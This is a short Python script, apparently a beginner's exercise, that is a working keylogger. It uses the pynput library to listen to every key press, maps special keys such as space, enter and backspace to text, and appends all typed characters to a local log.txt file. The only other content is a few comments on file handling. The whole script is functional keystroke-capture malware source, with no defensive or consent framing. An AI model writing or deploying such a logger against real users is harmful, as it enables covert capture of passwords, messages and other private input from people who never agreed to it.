# f = open("log.txt",'a')
# f.write("hello")
# f.close()

# 'with' keyword - releases memory/resources automatically
from pynput.keyboard import Listener

def writetofile(key):
   keydata = str(key)
   keydata = keydata.strip("'")
   
   if keydata == 'Key.space':
      keydata = ' '
   if keydata == 'Key.shift_r':
      keydata = ''
   if keydata == "Key.ctrl_l":
      keydata = ""
   if keydata == "Key.enter":
      keydata = "\n"
   if keydata == "Key.backspace":
      keydata = ""

   with open("log.txt",'a') as f:
      f.write(keydata) 

with Listener(on_press=writetofile) as l:
   l.join()
